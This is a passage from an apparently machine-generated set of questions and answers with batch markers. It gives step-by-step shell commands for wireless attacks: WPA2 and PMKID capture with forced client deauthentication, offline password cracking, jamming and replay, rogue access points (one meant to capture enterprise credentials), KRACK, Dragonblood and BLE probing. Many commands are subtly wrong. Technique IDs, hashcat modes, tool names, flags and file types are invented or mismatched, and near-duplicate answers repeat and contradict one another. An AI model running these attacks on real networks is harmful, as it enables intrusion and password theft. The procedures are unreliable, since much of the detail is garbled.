**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 — Capture PMKIDs:**
```bash
# Start capturing packets with hcxpcapngtool to capture PMKIDs
hcxpcapngtool -o output.hc22000 wlan0mon &
```

**Step 3 — Deauthenticate Client to Force Reauthentication:**
```bash
# Deauth the client to capture handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop Capturing and Crack PMKIDs:**
```bash
# Stop hcxpcapngtool
killall hcxpcapngtool

# Use hashcat to crack PMKIDs
hashcat -m 25420 output.hc22000 wordlist.txt
```

**Artifacts:**  
- Captured PMKID file (`output.hc22000`)
- Cracked password in `hashcat` output

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: What is a Bluetooth Low Energy (BLE) attack, and how can I perform one during my penetration test?
A: **Technique: BLE Attack — T1546**

**Step 1 — Scan for BLE Devices:**
```bash
# Scan for BLE devices
sudo hcitool lescan
```

**Step 2 — Connect to a Target Device:**
```bash
# Connect to the target device (replace with MAC address)
gatttool -b <target_MAC> --interactive
```

**Step 3 — Read Characteristics:**
```bash
# Read characteristics of interest
read 0x2a37
```

**Artifacts:**  
- BLE device information and data read from characteristics

**Cleanup:**
```bash
exit
```
===PAIR===
Q: How can I perform RF-based attacks, such as jamming or replay, during my penetration test?
A: **Technique: RF Jamming and Replay — T1590.001**

**Step 1 — Perform Jamming:**
```bash
# Use airjam to jam the wireless signal on a specific channel (replace with channel)
sudo airjam -c <channel> wlan0mon
```

**Step 2 — Perform Replay Attack:**
```bash
# Capture packets using airodump-ng
sudo airodump-ng wlan0mon --encrypt wpa2

# Deauth the client to capture handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon

# Replay captured packet (replace with packet number)
sudo aireplay-ng -r 10 wlan0mon <packet_number>
```

**Artifacts:**  
- Jamming effect on wireless devices
- Packet replay success or failure

**Cleanup:**
```bash
sudo airjam -c <channel> wlan0mon --stop
```
===PAIR===
Q: How can I set up a rogue access point during my penetration test?
A: **Technique: Rogue Access Point — T1590.001**

**Step 1 — Put Wireless Adapter in Monitor Mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 — Configure Hostapd for the Rogue AP:**
```bash
# Create hostapd configuration file
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 — Start the Rogue AP:**
```bash
sudo hostapd /tmp/hostapd.conf &
```

**Artifacts:**  
- New access point with SSID "RogueWiFi" and password "roguepassword"

**Cleanup:**
```bash
sudo killall hostapd
rm /tmp/hostapd.conf
```

=== BATCH 24 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during a penetration test?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture Handshake:**  
```bash
# Start capturing packets on the target channel and BSSID
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon -w capture
```

**Step 3 \u2014 Deauthenticate Clients (optional):**  
```bash
# Force clients to reconnect, which will likely retransmit the handshake
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Crack Handshake:**  
```bash
# Convert capture file to a format suitable for cracking
aircrack-ng capture-01.cap

# Use john or hashcat to crack the WPA2 password
john --format=wpa capture-01.cap
```

**Artifacts:**  
- Captured `.cap` files with handshakes.
- Cracked passwords logged by `john` or `hashcat`.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to detect and mitigate KRACK attacks?
A: **Technique: Detecting and Mitigating KRACK Attacks \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Check for vulnerable clients and APs
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Detect KRACK:**  
```bash
# Use `tcpdump` to capture packets on the target network
sudo tcpdump -i wlan0mon -w krack.pcap

# Analyze for retransmitted packets (KRACK indicator)
krackattack.py krack.pcap
```

**Step 3 \u2014 Mitigate KRACK:**  
```bash
# Update firmware and drivers of APs and clients
sudo apt update && sudo apt upgrade
```

**Artifacts:**  
- `.pcap` files with captured packets.
- Logs from `krackattack.py` indicating potential KRACK occurrences.

**Cleanup:**  
```bash
rm krack.pcap
```
===PAIR===
Q: How can I perform a PMKID attack on WPA2 networks?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets on the target channel and BSSID
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --wps

# Use `hcxpcapngtool` to extract PMKIDs from `.cap` files
hcxpcapngtool -z pmkid.hccapx capture-01.cap
```

**Step 3 \u2014 Crack PMKIDs:**  
```bash
# Use john or hashcat to crack the PMKIDs
john --format=wpapsk pmkid.hccapx
```

**Artifacts:**  
- Captured `.cap` files with PMKIDs.
- Cracked passwords logged by `john`.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture* pmkid.hccapx
```
===PAIR===
Q: How can I set up a rogue access point during a penetration test?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure Network Interface:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set up another interface for the rogue AP
sudo ip link set wlan1 up
```

**Step 2 \u2014 Define Hostapd Configuration:**  
```bash
# Create hostapd configuration file
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Start the Rogue AP:**  
```bash
# Start access point
sudo hostapd /tmp/hostapd.conf

# Assign IP address to the rogue interface
sudo ip addr add 192.168.1.1/24 dev wlan1
```

**Step 4 \u2014 Configure DNS and DHCP:**  
```bash
# Start dnsmasq for DNS and DHCP
sudo dnsmasq --interface=wlan1 --dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
```

**Artifacts:**  
- New AP visible in wireless network scans.
- Clients connecting to the rogue network.

**Cleanup:**  
```bash
sudo killall hostapd dnsmasq
sudo ip addr del 192.168.1.1/24 dev wlan1
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf
```
===PAIR===
Q: How can I perform a Bluetooth Low Energy (BLE) scan and identify devices?
A: **Technique: BLE Scan and Device Identification \u2014 T1590.001**

**Step 1 \u2014 Install Required Tools:**  
```bash
sudo apt install bluez-tools
```

**Step 2 \u2014 Perform BLE Scan:**  
```bash
# Scan for BLE devices
hcitool lescan --duplicates
```

**Step 3 \u2014 Identify Device Information:**  
```bash
# Get detailed information about a specific device
gatttool -b <device_address> --primary
```

**Artifacts:**  
- List of BLE device addresses and names.
- Detailed GATT services for each device.

**Cleanup:**  
No cleanup required, but ensure Bluetooth is turned off if not needed:
```bash
sudo hciconfig hci0 down
```
===PAIR===
Q: How can I perform wireless network reconnaissance to identify potential attack vectors?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1546**

**Step 1 \u2014 Scan for Networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a full scan of all networks
sudo airodump-ng wlan0mon --scan
```

**Step 2 \u2014 Analyze Network Information:**  
```bash
# Identify target networks based on encryption, signal strength, and other metrics
# Example: Look for WPA2 Enterprise or open networks with low security.
```

**Step 3 \u2014 Map Client Devices (optional):**
```bash
# Continuously scan to track client devices moving between APs
sudo airodump-ng wlan0mon --write=clients --output-format=csv
```

**Artifacts:**  
- `.csv` files with network and client information.
- Identified potential attack vectors based on security settings.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm clients*
```

=== BATCH 25 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture Handshake:**
```bash
# Start capturing the handshake
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write=handshake
```

**Step 3 \u2014 Crack Password Offline:**
```bash
# Convert .cap to .hccapx (if needed)
aircrack-ng handshake-01.cap -J handshake

# Use john the ripper or hashcat to crack the password
john --wordlist=wordlist.txt handshake.hccapx
```

**Artifacts:**
- Captured packets (.cap, .hccapx files)
- Cracked password (if successful)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm handshake*
```
===PAIR===
Q: What is a good way to detect and analyze Bluetooth Low Energy (BLE) devices in a network?
A: **Technique: BLE Device Scanning \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE Devices:**
```bash
# Use hcidump to capture BLE packets
sudo hcidump -a

# Or use bluetoothctl to list devices
bluetoothctl scan on
```

**Step 2 \u2014 Analyze Device Information:**
```bash
# Check device details with btmon
btmon
```

**Artifacts:**
- BLE packet captures (.pcap files)
- Device MAC addresses and names

**Cleanup:**
```bash
sudo hciconfig hci0 reset
```
===PAIR===
Q: How can I perform a KRACK attack on a WPA2 network?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Start KRACK Attack:**
```bash
# Use aireplay to inject packets and cause key reinstallation
sudo aireplay-ng -0 10 -a <target_BSSID> wlan0mon
```

**Artifacts:**
- Network performance degradation (e.g., packet loss, slower speeds)
- Client logs indicating reconnection attempts

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Can you explain how to perform a PMKID attack on WPA2?
A: **Technique: Pre-Shared Key Identifier (PMKID) Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture PMKIDs:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write=pmkid

# Or use hcxpcapngtool to extract PMKIDs
hcxpcapngtool pmkid-01.cap -z output.kix
```

**Step 3 \u2014 Crack Password:**
```bash
# Use hashcat to crack the password
hashcat -m 2500 output.kix wordlist.txt
```

**Artifacts:**
- Captured packets (.cap, .kix files)
- Cracked password (if successful)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid*
```
===PAIR===
Q: How can I perform a wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for Networks:**
```bash
# Use nmap to scan for wireless networks
sudo nmap -sn --script broadcast-dns-service

# Or use wlan.scan
wlan.scan
```

**Step 2 \u2014 Analyze Network Information:**
```bash
# Use airodump-ng to get detailed information
sudo airodump-ng wlan0mon
```

**Artifacts:**
- Network SSIDs, BSSIDs, channels, encryption types
- Client MAC addresses and signal strengths

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is an effective way to perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture Dragonblood Frames:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write=dragonblood

# Or use tshark to filter dragonblood frames
tshark -i wlan0mon -Y "wlan.fc.retry" -w dragonblood.pcapng
```

**Step 3 \u2014 Crack Password:**
```bash
# Use hashcat to crack the password
hashcat -m 16800 dragonblood.pcapng wordlist.txt
```

**Artifacts:**
- Captured packets (.pcapng files)
- Cracked password (if successful)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood*
```

=== BATCH 26 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001 (WPA2 Cracking)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture the WPA2 handshake:**
```bash
# Start capturing packets, filter for the target BSSID and channel
sudo airodump-ng -c <channel> -w capture --bssid <BSSID> wlan0mon &
```

**Step 3 \u2014 Deauthenticate clients to force re-authentication:**
```bash
# Deauthenticate all clients associated with the AP
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 4 \u2014 Stop capturing and crack the handshake:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Use aircrack-ng to crack the captured WPA2 handshake
sudo aircrack-ng capture-01.kismet.netkeys -w wordlist.txt
```

**Artifacts:**  
- Captured .kismet.netkeys file containing the WPA2 handshake.
- Cracked PSK (Pre-Shared Key) if successful.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to identify potential vulnerabilities in wireless networks during penetration testing?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001 (Network Discovery)**

**Step 1 \u2014 Scan for available networks:**  
```bash
# Scan for all wireless networks
sudo nmap -sn --script broadcast-dns-sd-probe,arp-scan,hostapd-wpe wlan0
```

**Step 2 \u2014 Detailed information about each network:**
```bash
# Use airodump-ng to get detailed info
sudo airodump-ng wlan0mon
```

**Artifacts:**  
- Nmap scan results showing devices and services.
- Airodump-ng output with BSSID, SSID, encryption types, and client lists.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Can you explain how to perform a KRACK (Key Reinstallation Attack) on a WPA2 network?
A: **Technique: KRACK \u2014 T1595.001 (KRACK)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture the WPA2 handshake:**
```bash
# Start capturing packets, filter for the target BSSID and channel
sudo airodump-ng -c <channel> -w capture --bssid <BSSID> wlan0mon &
```

**Step 3 \u2014 Deauthenticate clients to force re-authentication:**
```bash
# Deauthenticate all clients associated with the AP
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 4 \u2014 Perform KRACK attack using Aircrack-ng:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Use aircrack-ng to perform the KRACK attack
sudo aireplay-ng -R 5 -c <client_MAC> -a <BSSID> wlan0mon
```

**Artifacts:**  
- Captured .kismet.netkeys file containing the WPA2 handshake.
- Possible re-authentication attempts and key reinstallations.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I set up a rogue access point during penetration testing?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001 (Rogue AP)**

**Step 1 \u2014 Configure wireless interface:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set up a second interface for the rogue AP
sudo ifconfig wlan1 up
```

**Step 2 \u2014 Install and configure hostapd:**
```bash
# Install hostapd
sudo apt install hostapd

# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Start the rogue AP:**
```bash
# Start hostapd
sudo hostapd /tmp/hostapd.conf &
```

**Artifacts:**  
- New SSID "RogueWiFi" visible during wireless scans.
- Clients connecting to the rogue AP.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo killall hostapd
rm /tmp/hostapd.conf
```
===PAIR===
Q: What is a PMKID attack, and how can I use it on a WPA2 network?
A: **Technique: PMKID Attack \u2014 T1595.001 (PMKID)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture PMKIDs:**
```bash
# Start capturing packets, filter for the target BSSID and channel
sudo airodump-ng -c <channel> -w capture --bssid <BSSID> wlan0mon &
```

**Step 3 \u2014 Deauthenticate clients to force re-authentication:**
```bash
# Deauthenticate all clients associated with the AP
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 4 \u2014 Stop capturing and crack the PMKIDs:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Use hashcat to crack the captured PMKIDs
sudo hashcat -m 16800 capture-01.kismet.netkeys wordlist.txt
```

**Artifacts:**  
- Captured .kismet.netkeys file containing the PMKIDs.
- Cracked PSK (Pre-Shared Key) if successful.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a BLE (Bluetooth Low Energy) scan and identify devices during penetration testing?
A: **Technique: Bluetooth Low Energy Scan \u2014 T1590.001 (BLE Discovery)**

**Step 1 \u2014 Install necessary tools:**  
```bash
# Install hcidump and hcitool
sudo apt install bluez-tools
```

**Step 2 \u2014 Scan for BLE devices:**  
```bash
# Perform a BLE scan
hcitool lescan
```

**Artifacts:**  
- List of BLE device MAC addresses and names.

**Cleanup:**  
No specific cleanup required, but ensure Bluetooth is turned off if not needed:
```bash
sudo hciconfig hci0 down
```

=== BATCH 27 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during my wireless testing?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture Handshake:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Step 3 \u2014 Deauthenticate Client:**  
```bash
# Force client to re-authenticate and send new handshake
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Crack the Handshake:**  
```bash
# Use a wordlist to crack the captured WPA2 PSK
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured .cap file containing handshake packets.
- Cracked password in console output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: Can you explain how to set up a rogue access point and what tools are commonly used?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Install Required Tools:**  
```bash
sudo apt install hostapd dnsmasq
```

**Step 2 \u2014 Configure Hostapd:**  
```bash
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueAP
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Configure Dnsmasq:**  
```bash
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.1.50,192.168.1.150,12h
EOF
```

**Step 4 \u2014 Start Services:**  
```bash
sudo systemctl start hostapd
sudo systemctl start dnsmasq
```

**Artifacts:**  
- Clients connecting to "RogueAP" with the password "roguepassword".
- Captured data packets that can be analyzed for further information.

**Cleanup:**  
```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
rm /etc/hostapd/hostapd.conf
rm /etc/dnsmasq.conf
```
===PAIR===
Q: What is a KRACK attack, and how can I exploit it during my tests?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthenticate Client:**  
```bash
# Force client to re-authenticate and send new handshake
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture Packets:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Step 4 \u2014 Analyze and Exploit KRACK:**  
```bash
# Use tshark to filter out retransmitted packets (KRACK symptom)
tshark -r capture-01.cap "wlan.fc.retry == 1"
```

**Artifacts:**  
- Captured .cap file showing potential retransmissions.
- Analysis of packet data for anomalies indicating KRACK.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a wireless network reconnaissance and mapping during my tests?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for Networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a scan to find all networks
sudo airodump-ng wlan0mon --scan
```

**Step 2 \u2014 Detailed Network Mapping:**  
```bash
# Capture packets for more detailed mapping
sudo airodump-ng wlan0mon -w map --output-format csv
```

**Artifacts:**  
- CSV file containing network details (BSSID, SSID, Channel, Encryption).
- Visualization tools like Kismet can be used to plot the data.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm map*
```
===PAIR===
Q: What is a PMKID attack for WPA2, and how can I perform it?
A: **Technique: Pre-Shared Key Identifier (PMKID) Attack \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w pmkid wlan0mon --pmkfile=pmkid.txt
```

**Step 3 \u2014 Crack the PMKID:**  
```bash
# Use a wordlist to crack the captured PMKIDs
aircrack-ng pmkid-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured .cap file containing PMKIDs.
- Cracked password in console output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm pmkid*
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack, and what tools are typically used?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture Handshake:**  
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w dragonblood wlan0mon
```

**Step 3 \u2014 Deauthenticate Client:**  
```bash
# Force client to re-authenticate and send new handshake
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Crack the Handshake:**  
```bash
# Use a wordlist to crack the captured WPA3 PSK
aircrack-ng dragonblood-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured .cap file containing handshake packets.
- Cracked password in console output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood*
```

=== BATCH 28 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the handshake:**  
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> wlan0mon -w capture

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Crack the captured handshake:**  
```bash
# Use a wordlist to crack the password
aircrack-ng capture-<number>.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured .cap file containing handshakes.
- Cracked passwords in the aircrack-ng output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is an effective way to perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a scan to find all networks
sudo airodump-ng wlan0mon --scan
```

**Step 2 \u2014 Detailed network mapping:**  
```bash
# Map the network by capturing packets and noting details
sudo airodump-ng wlan0mon -w map_output
```

**Artifacts:**  
- .cap file with captured packets.
- Network details such as BSSID, ESSID, channel, encryption type.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm map_output*
```
===PAIR===
Q: How can I set up a rogue access point to capture WPA2 Enterprise credentials?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure the wireless interface:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set up a new virtual interface for the rogue AP
sudo iw dev wlan0mon interface add wlan0ap type managed
```

**Step 2 \u2014 Start the rogue access point:**  
```bash
# Configure hostapd for WPA2 Enterprise
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0ap
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
eap_reauth_period=300
radius_server=127.0.0.1
radius_port=1812
radius_secret=secret
EOF

# Start hostapd
sudo hostapd /tmp/hostapd.conf
```

**Step 3 \u2014 Set up a RADIUS server:**  
```bash
# Install freeradius
sudo apt install freeradius

# Configure radius server (default configuration usually works)
sudo systemctl start freeradius
```

**Artifacts:**  
- Captured EAPOL packets.
- Authentication logs from the radius server.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo iw dev wlan0ap del
sudo systemctl stop hostapd
rm /tmp/hostapd.conf
```
===PAIR===
Q: Can you describe a KRACK attack and how to perform it?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthenticate the client:**  
```bash
# Force clients to reconnect and initiate a new handshake
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture packets:**  
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> wlan0mon -w capture
```

**Step 4 \u2014 Analyze and exploit the KRACK vulnerability:**  
```bash
# Use a tool like Aircrack-ng to analyze the captured packets for vulnerabilities
aircrack-ng capture-<number>.cap

# If the attack is successful, the client will retransmit data frames with the same key.
```

**Artifacts:**  
- Captured .cap file containing packets.
- Analysis results from Aircrack-ng.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a PMKID attack, and how can I perform it against WPA2 networks?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> wlan0mon -w pmkid_capture

# Deauthenticate the client to force a new handshake and capture the PMKID
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Crack the captured PMKIDs:**  
```bash
# Use a wordlist to crack the password
aircrack-ng pmkid_capture-<number>.cap -w /usr/share/wordlists/rockyou.txt
```

**Artifacts:**  
- Captured .cap file containing PMKIDs.
- Cracked passwords in the aircrack-ng output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
```
===PAIR===
Q: How can I perform Bluetooth Low Energy (BLE) attacks during penetration testing?
A: **Technique: BLE Attacks \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE devices:**  
```bash
# Use hcidump to scan for BLE devices
sudo hcidump -a -i <interface>
```

**Step 2 \u2014 Connect and interact with a device:**  
```bash
# Use gatttool to connect and read/write characteristics
gatttool -b <device_address> --char-read -a <attribute_handle>
```

**Step 3 \u2014 Perform a service discovery:**  
```bash
# Discover services offered by the BLE device
gatttool -b <device_address> --primary
```

